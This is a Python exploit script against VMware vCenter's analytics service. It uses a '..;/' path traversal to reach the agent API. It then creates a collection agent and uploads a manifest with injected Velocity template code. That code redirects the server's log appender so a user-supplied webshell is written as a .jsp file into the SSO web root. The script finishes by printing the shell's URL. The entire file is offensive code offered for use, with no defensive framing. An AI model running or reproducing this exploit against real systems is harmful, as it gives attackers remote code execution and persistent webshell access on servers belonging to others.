import random
import string
import requests
import argparse
import warnings

warnings.filterwarnings('ignore', message='Unverified HTTPS request')


def id_generator(size=6, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


def str_to_escaped_unicode(arg_str):
    escaped_str = ''
    for s in arg_str:
        val = ord(s)
        esc_uni = "\\u{:04x}".format(val)
        escaped_str += esc_uni
    return escaped_str


def post_data(url, data):
    headers = {"Cache-Control": "max-age=0",
               "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0",
               "X-Deployment-Secret": "abc",
               "Content-Type": "application/json",
               "Connection": "close"}
    requests.post(url, headers=headers, json=data, verify=False)


def upload_manifest(target, agent_name, log_param, manifest_data):
    print("[*] uploading manifest")
    url = "%s/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&_c=%s&_i=%s" % (
        target, agent_name, log_param)
    data = {"contextData": "a3", "manifestContent": manifest_data, "objectId": "a2"}
    post_data(url, data)


def create_agent(target, agent_name, log_param):
    print("[*] creating agent")
    url = "%s/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?_c=%s&_i=%s" % (
    target, agent_name, log_param)
    data = {"manifestSpec": {},
            "objectType": "a2",
            "collectionTriggerDataNeeded": True,
            "deploymentDataNeeded": True,
            "resultNeeded": True,
            "signalCollectionCompleted": True,
            "localManifestPath": "a7",
            "localPayloadPath": "a8",
            "localObfuscationMapPath": "a9"}
    post_data(url, data)


def generate_manifest(name, content):
    content = str_to_escaped_unicode(content)
    path = "/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/%s" % name
    data = """<manifest recommendedPageSize="500">
       <request>
          <query name="vir:VCenter">
             <constraint>
                <targetType>ServiceInstance</targetType>
             </constraint>
             <propertySpec>
                <propertyNames>content.about.instanceUuid</propertyNames>
                <propertyNames>content.about.osType</propertyNames>
                <propertyNames>content.about.build</propertyNames>
                <propertyNames>content.about.version</propertyNames>
             </propertySpec>
          </query>
       </request>
       <cdfMapping>
          <indepedentResultsMapping>
             <resultSetMappings>
                <entry>
                   <key>vir:VCenter</key>
                   <value>
                      <value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="resultSetMapping">
                         <resourceItemToJsonLdMapping>
                            <forType>ServiceInstance</forType>
                         <mappingCode><![CDATA[    
                            #set($appender = $GLOBAL-logger.logger.parent.getAppender("LOGFILE"))##
                            #set($orig_log = $appender.getFile())##
                            #set($logger = $GLOBAL-logger.logger.parent)##     
                            $appender.setFile("%s")##     
                            $appender.activateOptions()##  
                            $logger.warn("%s")##   
                            $appender.setFile($orig_log)##     
                            $appender.activateOptions()##]]>
                         </mappingCode>
                         </resourceItemToJsonLdMapping>
                      </value>
                   </value>
                </entry>
             </resultSetMappings>
          </indepedentResultsMapping>
       </cdfMapping>
       <requestSchedules>
          <schedule interval="1h">
             <queries>
                <query>vir:VCenter</query>
             </queries>
          </schedule>
       </requestSchedules>
    </manifest>""" % (path, content)
    return data

if __name__ == '__main__':
   parser = argparse.ArgumentParser()
   parser.add_argument("-t", "--target", help="目标URL (e.g. https://192.168.1.1)", required=True)
   parser.add_argument("-s", "--shell", help="WebShell路径", required=True)
   args = parser.parse_args()

   target = args.target
   if target[-1] == "/":
      target = target[0:-1]

   log_param = id_generator(6)
   agent_name = id_generator(6)
   shell_name = id_generator(6) + ".jsp"

   with open(args.shell) as file:
      create_agent(target, agent_name, log_param)
      upload_manifest(target, agent_name, log_param, generate_manifest(shell_name, file.read()))

   print(f"\033[92m[+] {target}/idm/..;/{shell_name} \033[0m")
